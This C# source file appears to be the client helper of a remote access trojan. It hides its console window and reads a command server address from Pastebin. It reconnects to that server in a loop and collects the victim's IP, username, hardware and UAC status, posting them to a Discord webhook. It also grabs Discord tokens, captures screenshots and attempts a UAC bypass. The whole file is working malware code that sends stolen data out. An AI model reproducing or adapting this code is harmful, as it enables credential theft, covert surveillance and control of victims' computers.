using LazyServer;
using Newtonsoft.Json.Linq;
using PentestTools;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Encoder = System.Drawing.Imaging.Encoder;

public static class GClass
{
    // DLL Imports for console visibility
    [DllImport("kernel32.dll")] private static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    private const int SW_HIDE = 0;
    private const int SW_SHOW = 5;

    private static JObject _cachedConfig;

    public static JObject config()
    {
        if (_cachedConfig != null)
            return _cachedConfig;

        var assembly = Assembly.GetExecutingAssembly();
        var resourceName = "Client.config.json";

        using (Stream stream = assembly.GetManifestResourceStream(resourceName))
        using (StreamReader reader = new StreamReader(stream))
        {
            _cachedConfig = JObject.Parse(reader.ReadToEnd());
            return _cachedConfig;
        }
    }

    public static bool IsTrue(string param)
    {
        return config()[param]?.Value<bool>() ?? false;
    }

    public static void ShowCmd(bool show)
    {
        var handle = GetConsoleWindow();
        ShowWindow(handle, show ? SW_SHOW : SW_HIDE);
    }

    public static async Task ReconnectLoop(LazyServerClient client)
    {
        var server = (string)config()["server"];
        var port = (int)config()["port"];

        if ((bool)config()["pastebin"]) {
            try
            {
                string pastebinres = await new HttpClient().GetStringAsync((string)config()["pastebinlink"]);
                if (!String.IsNullOrEmpty(pastebinres))
                {
                    string[] strings = pastebinres.Split(':');

                    server = strings[0];
                    port = Int32.Parse(strings[1]);
                };
            } catch {
                server = (string)config()["server"];
                port = (int)config()["port"];
            }
        }

        while (true)
        {
            try
            {
                await client.ConnectAsync(server, port);
                break;
            }
            catch
            {
                Console.WriteLine("Retrying connection in 1 second...");
                await Task.Delay(300);
                Console.WriteLine("haha i lied, retrying connection NOW");
            }
        }
    }

    public static async Task<string> GetIp()
    {
        try
        {
            var ip = await new HttpClient().GetStringAsync("http://icanhazip.com");
            return ip.Trim();
        }
        catch
        {
            return "Unknown";
        }
    }

    public static JObject GetDeviceInfo()
    {
        return new JObject
        {
            ["username"] = DeviceInfo.GetUsername(),
            ["os"] = DeviceInfo.GetOSInfo(),
            ["cpu"] = DeviceInfo.GetCPUInfo(),
            ["gpu"] = DeviceInfo.GetGPUInfo(),
            ["uac"] = DeviceInfo.GetUACStatus(),
            ["hwid"] = DeviceInfo.GetHWID()
        };
    }

    public static async Task SendWebhookNotificationAsync(string webhookUrl, JObject info)
    {
        try
        {
            var embed = new JObject
            {
                ["title"] = "🟢 New Client Connected",
                ["color"] = 65280,
                ["fields"] = new JArray
                {
                    new JObject { ["name"] = "IP", ["value"] = $"`{info["ip"]}`", ["inline"] = true },
                    new JObject { ["name"] = "Username", ["value"] = $"`{info["username"]}`", ["inline"] = true },
                    new JObject { ["name"] = "OS", ["value"] = $"`{info["os"]}`", ["inline"] = false },
                    new JObject { ["name"] = "CPU", ["value"] = $"`{info["cpu"]}`", ["inline"] = false },
                    new JObject { ["name"] = "GPU", ["value"] = $"`{info["gpu"]}`", ["inline"] = false },
                    new JObject { ["name"] = "UAC Status", ["value"] = $"`{info["uac"]}`", ["inline"] = true },
                    new JObject { ["name"] = "HWID", ["value"] = $"`{info["hwid"]}`", ["inline"] = false }
                },
                ["footer"] = new JObject
                {
                    ["text"] = "Client connected at " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")
                }
            };

            var payload = new JObject
            {
                ["embeds"] = new JArray { embed }
            };

            using var httpClient = new HttpClient();
            var content = new StringContent(payload.ToString(), Encoding.UTF8, "application/json");
            await httpClient.PostAsync(webhookUrl, content);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Webhook error: " + ex.Message);
        }
    }

    public static string GetDiscordTokens()
    {
        return string.Join(" || ", DiscordGrabber.GetTokens());
    }

    public static void StartHeartbeat(LazyServerClient client)
    {
        Task.Run(async () =>
        {
            while (true)
            {
                try
                {
                    if (client != null && client.IsConnected)
                    {
                        var payload = Encoding.UTF8.GetBytes("ping");
                        await client.SendHeartbeat(payload);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Heartbeat error: {ex.Message}");
                }

                await Task.Delay(30000);
            }
        });
    }

    public static byte[] CaptureScreen(Screen screen, int quality = 100)
    {
        return DeviceInfo.Capture(screen, quality);
    }


    public static ImageCodecInfo GetEncoder(ImageFormat format)
    {
        return ImageCodecInfo.GetImageDecoders().FirstOrDefault(codec => codec.FormatID == format.Guid);
    }

    public static async Task<bool> TryBypassAndReconnect(LazyServerClient client, byte[] screenshot)
    {
        if (!UacBypassHelper.TryBypassUAC())
        {
            Console.WriteLine("UAC Bypass failed.");
            await Task.Delay(3000);
            await ReconnectLoop(client);

            var info = await BuildClientInfo();
            await client.SendFileBytesWithMeta(screenshot, info.ToString());

            await client.SendFileBytesWithMeta(screenshot, new JObject
            {
                ["msg"] = "log",
                ["message"] = "Failed to UAC Bypass",
                ["type"] = "Error"
            }.ToString());

            return false;
        }

        return true;
    }

    public static async Task<JObject> BuildClientInfo()
    {
        return new JObject
        {
            ["msg"] = "alive",
            ["ip"] = await GetIp(),
            ["username"] = DeviceInfo.GetUsername(),
            ["os"] = DeviceInfo.GetOSInfo(),
            ["cpu"] = DeviceInfo.GetCPUInfo(),
            ["gpu"] = DeviceInfo.GetGPUInfo(),
            ["uac"] = DeviceInfo.GetUACStatus(),
            ["hwid"] = DeviceInfo.GetHWID()
        };
    }
}
